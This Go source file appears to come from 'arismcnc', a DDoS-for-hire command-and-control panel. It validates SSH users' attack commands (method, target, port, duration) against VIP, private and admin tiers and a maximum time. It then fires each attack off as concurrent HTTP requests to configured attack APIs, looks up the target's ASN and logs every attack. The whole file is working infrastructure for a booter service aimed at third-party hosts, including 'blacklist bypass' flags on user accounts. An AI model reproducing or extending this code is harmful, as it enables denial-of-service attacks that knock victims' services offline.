package managers

import (
	"arismcnc/database"
	"arismcnc/utils"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gliderlabs/ssh"
)

type MethodInfo struct {
	defaultPort uint16
	defaultTime uint32
	MinTime     uint32
	MaxTime     uint32
}

// Attack holds the parameters for an attack request
type Attack struct {
	Duration   uint32
	Type       uint8
	Target     string
	Port       string
	MethodName string
	API        []string
	Enabled    bool
}

// NewAttack validates and creates a new attack from user arguments
func NewAttack(session ssh.Session, args []string, vip bool, private bool, admin bool, maxtime int, db *database.Database) (*Attack, error) {
	if len(args) < 4 {
		return nil, errors.New("Invalid arguments. Usage: <method> <target> <port> <duration>")
	}

	method, err := utils.GetMethod(args[0])
	if err != nil {
		return nil, err
	}

	// Permission checks
	if utils.HasVipPermission(method.Method) && !vip {
		return nil, errors.New("VIP permission required for this method")
	}
	if utils.HasPrivatePermission(method.Method) && !private {
		return nil, errors.New("Private permission required for this method")
	}
	if utils.HasAdminPermission(method.Method) && !admin {
		return nil, errors.New("Admin permission required for this method")
	}

	atkInfo := MethodInfo{
		defaultPort: method.DefaultPort,
		defaultTime: method.DefaultTime,
		MinTime:     method.MinTime,
		MaxTime:     method.MaxTime,
	}
	atk := &Attack{
		MethodName: args[0],
		Target:     args[1],
	}

	port, err := strconv.Atoi(args[2])
	if err != nil {
		return nil, errors.New("Invalid port")
	}
	atk.Port = strconv.Itoa(port)

	duration, err := strconv.Atoi(args[3])
	if err != nil || uint32(duration) < atkInfo.MinTime || uint32(duration) > atkInfo.MaxTime || duration > maxtime {
		return nil, fmt.Errorf("Invalid duration. Must be between %d and %d seconds", atkInfo.MinTime, atkInfo.MaxTime)
	}
	atk.Duration = uint32(duration)
	atk.API = method.API
	atk.Enabled = method.Enabled

	return atk, nil
}

// Build sends the attack to all configured API endpoints and returns branding message
func (this *Attack) Build(session ssh.Session, db *database.Database, config *utils.Config) (bool, error, string) {
	userInfo := db.GetAccountInfo(session.User())
	apiList := this.API

	if !this.Enabled {
		return false, errors.New("Method not enabled"), ""
	}

	// Send API requests in background
	go func() {
		responses := make(chan string, len(apiList))
		client := &http.Client{
			Transport: &http.Transport{
				MaxIdleConns:        1000,
				MaxIdleConnsPerHost: 1000,
				IdleConnTimeout:     30 * time.Second,
			},
			Timeout: 2 * time.Second,
		}

		var wg sync.WaitGroup
		sem := make(chan struct{}, 1000)

		for _, apiLink := range apiList {
			finalLink := replacePlaceholders(apiLink, this.MethodName, this.Target, this.Port, this.Duration)
			wg.Add(1)
			go func(link string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				res, err := client.Get(link)
				if err != nil {
					log.Printf("[ATTACK] Error sending request to: %s - %v", link, err)
					responses <- fmt.Sprintf("[ATTACK] %s response: error", link)
					return
				}
				defer res.Body.Close()
				io.Copy(io.Discard, res.Body)
				responses <- fmt.Sprintf("[ATTACK] %s response: sent", link)
			}(finalLink)
		}

		wg.Wait()
		close(responses)
		log.Printf("[INFO] Attack to %d API endpoints completed", len(apiList))
	}()

	// Fetch target ASN info
	type IpApiResult struct {
		Country string `json:"country"`
		Org     string `json:"organization"`
		Region  string `json:"region"`
	}
	type IpInfoResult struct {
		Country string `json:"country"`
		Org     string `json:"org"`
		Region  string `json:"region"`
	}

	var url string
	var data interface{}
	var dataMap map[string]string

	if strings.Contains(this.Target, "http") || strings.Contains(this.Target, "www") {
		url = "http://" + config.ProxyURL + "/?ip=" + this.Target
		data = &IpApiResult{}
	} else {
		url = "https://ipinfo.io/" + this.Target + "/json?token=" + config.IpinfoToken
		data = &IpInfoResult{}
	}

	client := &http.Client{Timeout: 3 * time.Second}
	asninfo, err := client.Get(url)
	if err != nil {
		log.Println("[!] Failed to retrieve ASN info:", err)
		dataMap = map[string]string{"country": "Unknown", "org": "Unknown", "region": "Unknown"}
	} else {
		defer asninfo.Body.Close()
		content, err := io.ReadAll(asninfo.Body)
		if err != nil {
			log.Println("[!] Failed to read ASN info response:", err)
			dataMap = map[string]string{"country": "Unknown", "org": "Unknown", "region": "Unknown"}
		} else {
			json.Unmarshal(content, data)
			switch v := data.(type) {
			case *IpApiResult:
				dataMap = map[string]string{"country": v.Country, "org": v.Org, "region": v.Region}
			case *IpInfoResult:
				dataMap = map[string]string{"country": v.Country, "org": v.Org, "region": v.Region}
			default:
				dataMap = map[string]string{"country": "Unknown", "org": "Unknown", "region": "Unknown"}
			}
		}
	}

	// Log attack
	lm, err := NewLogManager("./assets/logs/logs.json")
	if err != nil {
		log.Printf("Error initializing LogManager: %v", err)
	} else {
		defer lm.Close()
		lm.Log("New Attack (C2)!\nUsername: " + session.User() + "\nTarget: " + this.Target + "\nPort: " + this.Port + "\nTime: " + strconv.Itoa(int(this.Duration)) + "\nMethod: " + this.MethodName + "\n----------------------")
	}

	// Build attack-sent branding message
	expiryTime, _ := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	sentMessage := utils.Branding(session, "attack-sent", map[string]interface{}{
		"attack.Target":            this.Target,
		"attack.Port":              this.Port,
		"attack.Time":              strconv.Itoa(int(this.Duration)),
		"attack.Method":            this.MethodName,
		"attack.Country":           dataMap["country"],
		"attack.Org":               dataMap["org"],
		"attack.Region":            dataMap["region"],
		"attack.Date":              time.Now().Format("2006-01-02 15:04:05"),
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
		"clear":                    "\x1b[2J \x1b[H",
	})
	log.Println("Attack information sent to user interface")
	return false, nil, sentMessage
}

func replacePlaceholders(apiLink string, method string, target string, port string, duration uint32) string {
	apiLink = strings.ReplaceAll(apiLink, "{host}", target)
	apiLink = strings.ReplaceAll(apiLink, "{port}", port)
	apiLink = strings.ReplaceAll(apiLink, "{time}", strconv.Itoa(int(duration)))
	apiLink = strings.ReplaceAll(apiLink, "{method}", method)
	apiLink = strings.ReplaceAll(apiLink, "<<$host>>", target)
	apiLink = strings.ReplaceAll(apiLink, "<<$port>>", port)
	apiLink = strings.ReplaceAll(apiLink, "<<$time>>", strconv.Itoa(int(duration)))
	apiLink = strings.ReplaceAll(apiLink, "<<$method>>", method)
	return apiLink
}

// Contains checks if a method name exists in the methods list
func Contains(methods []utils.Method, s string) bool {
	for _, a := range methods {
		if a.Method == s {
			return true
		}
	}
	return false
}

// ValidIP4 checks if a string is a valid IP address
func ValidIP4(s string) bool {
	return net.ParseIP(s) != nil
}

// Ensure os import is used
var _ = os.Exit
